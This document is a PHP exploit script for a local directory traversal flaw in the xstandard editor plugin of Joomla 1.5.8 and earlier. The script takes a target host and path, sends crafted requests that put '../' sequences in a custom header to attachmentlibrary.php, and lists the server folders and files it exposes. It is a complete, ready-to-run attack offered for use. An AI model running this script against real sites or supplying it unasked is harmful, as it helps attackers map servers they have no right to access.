&lt;?php
/*
 Joomla &lt;= 1.5.8 (xstandard editor) Local Directory Traversal Vulnerability
 
 discovered by: irk4z[at]yahoo.pl
 greets: all friends ;) 
*/

echo &quot;* Joomla &lt;= 1.5.8 (xstandard editor) Local Directory Traversal Vuln\n&quot;;
echo &quot;* discovered by: irk4z[at]yahoo.pl\n&quot;;
echo &quot;*\n&quot;;
echo &quot;* greets: all friends ;) enjoy!\n&quot;;
echo &quot;*------------------------------------------------------------------*\n&quot;;

$host = $argv[1];
$path = $argv[2];
$folder = $argv[3];

if (empty($host) || empty($path)) {
	echo &quot;usage: php {$argv[0]} &lt;host&gt; &lt;path&gt; [&lt;folder&gt;]\n&quot;;
	echo &quot;       php {$argv[0]} example.org /joomla\n&quot;;
	echo &quot;       php {$argv[0]} example.org /joomla ../../\n&quot;;
	exit;
}

echo &quot;http://&quot; . $host . $path . &quot;/images/stories/\n\n&quot;;

if ( empty($folder) ){
	$lev = &quot;./&quot;;
	for( $i = 0; $i &lt;= 7; $i++ ) {
		echo browseFolder($host, $path, $lev);
		$lev .= &quot;../&quot;;
	}
} else {
	echo browseFolder($host, $path, $folder);
}

function browseFolder($host, $path, $folder){
	
	$packet = &quot;GET {$path}/plugins/editors/xstandard/attachmentlibrary.php HTTP/1.1\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;X_CMS_LIBRARY_PATH: {$folder}\r\n&quot;;
	$packet .= &quot;Connection: Close\r\n\r\n&quot;;

	$o = @fsockopen($host, 80);
	if(!$o){
		echo &quot;\n[x] No response...\n&quot;;
		die;
	}
	
	fputs($o, $packet);
	while (!feof($o)) $data .= fread($o, 1024);
	fclose($o);
	
	$_404 = strstr( $data, &quot;HTTP/1.1 404 Not Found&quot; );
	if ( !empty($_404) ){
		echo &quot;\n[x] 404 Not Found... Maybe wrong path? \n&quot;;
		die;
	}
	
	//folders
	preg_match_all(&quot;/&lt;baseURL&gt;([^&lt;]+)&lt;\/baseURL&gt;/&quot;, $data, $matches);
	//files
	preg_match_all(&quot;/&lt;value&gt;([^&lt;]+\.[^&lt;]{3,4})&lt;\/value&gt;/&quot;, $data, $matches2);
	
	$matches = array_merge( $matches[1], $matches2[1] );
	
	if ( empty($matches) ){
		$ret = &quot;$folder [x] Failed...\n&quot;;
	} else {
		$ret = &#039;&#039;;
		foreach( $matches as $tmp){
			$ret .= str_replace(&quot;images/stories/&quot;, &#039;&#039;, str_replace(&quot;/./&quot;, &quot;/&quot;, str_replace(&quot;//&quot;, &quot;/&quot;, urldecode($tmp) ) ) ) . &quot;\n&quot;;
		}
	}
	
	return ($ret);
}

?&gt;